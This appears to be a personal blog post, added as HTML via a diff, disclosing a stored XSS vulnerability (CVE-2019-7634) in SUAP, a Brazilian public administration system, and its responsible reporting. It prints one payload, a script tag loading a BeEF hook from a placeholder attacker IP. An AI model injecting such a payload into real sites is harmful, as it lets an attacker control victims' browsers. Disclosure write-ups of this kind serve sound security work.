@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>Home - Cristian Souza</title>
+        <meta charset="UTF-8">
+        <meta name="description" content="Cristian Souza is an undergraduate student and researcher.">
+        <meta name="keywords" content="Information Security, Researcher, Resume, News">
+        <meta name="author" content="Cristian Souza">
+
+        <link rel="stylesheet" type="text/css" href="../../css/style.css">
+        <link rel="shortcut icon" type="image/x-icon" href="../../imgs/favicon.ico">
+    </head>
+
+    <body>
+        <div class="menu">
+            <center>
+                <img id="profilepic" src="../../imgs/personal_photos/profilepic.jpeg"/>
+                <h1>Cristian Souza</h1>
+            </center>
+
+            <div class="menu_links">
+                <a href="../../index.html">Home</a>
+                <a href="../../bio.html">Bio</a>
+                <a href="#" class="active">Blog</a>
+                <a href="../../projects.html">Projects</a>
+                <a href="../../publications.html">Publications</a>
+                <a href="../../files.html">Talks and files</a>
+            </div>
+
+            <div class="sm_links">
+                <ul id="social_media">
+                    <li><a target="_blank" href="mailto:cristianmsbr@gmail.com"><img src="../../imgs/logos/mail.svg"/></a></li>
+                    <li><a target="_blank" href="https://github.com/crhenr"><img src="../../imgs/logos/github.svg"/></a></li>
+                    <li><a target="_blank" href="https://linkedin.com/in/crhenr"><img src="../../imgs/logos/linkedin.svg"/></a></li>
+                    <li><a target="_blank" href="https://medium.com/@crhenr"><img src="../../imgs/logos/medium.svg"/></a></li>
+                    <li><a target="_blank" href="https://twitter.com/crhenr"><img src="../../imgs/logos/twitter.svg"/></a></li>
+                </ul>
+            </div>
+        </div>
+
+        <main class="max_wd">
+            <h1>CVE-2019–7634: My first CVE</h1>
+
+            <p>In this post, I will provide details about my first CVE. The vulnerability was discovered when I was on vacation and needed to update a piece of personal information in SUAP (Sistema Unificado de Administração Pública), a system used by several federal public institutions in Brazil.</p>
+
+            <ul>
+                <li>Vulnerability: <strong>Stored XSS</strong></li>
+                <li>Developer: <strong>IFRN</strong></li>
+                <li>Affected project: <strong>SUAP v2</strong></li>
+            </ul>
+
+            <h2>The vulnerability</h2>
+
+            <p>The vulnerability was Cross-site scripting (XSS). This kind of threat allows attackers to inject JavaScript code inside a web page. In the case of SUAP, it was a stored XSS. In this way, the attacker could also save the malicious code in the database of the application.</p>
+
+            <p>After trying different payloads on various pages of the system, I finally found a flaw when updating the user’s data. I simply append the following payload to a field in the form:</p>
+
+            <code>
+                &lt;script src="&lt;IP&gt;:3000/hook.js"&gt;&lt;/script&gt;
+            </code>
+
+            <p>And Voilà! This code will open a connection to <a target="_blank" href="https://beefproject.com/">Beef</a>, allowing me to inject different payloads in the victim’s browser remotely.</p>
+
+            <p>After this, I immediately contacted the administration of the service with a Proof of Concept (PoC). The response was very fast and they quickly corrected the flaw. I suppose that now all the federal institutions using SUAP received the update.</p>
+
+            <p>XSS vulnerabilities are very common and are not that hard to be discovered, but everyone has to start somewhere. Besides, I had the opportunity to learn about the whole process of requesting a CVE.</p>
+        </main>
+    </body>
+</html>
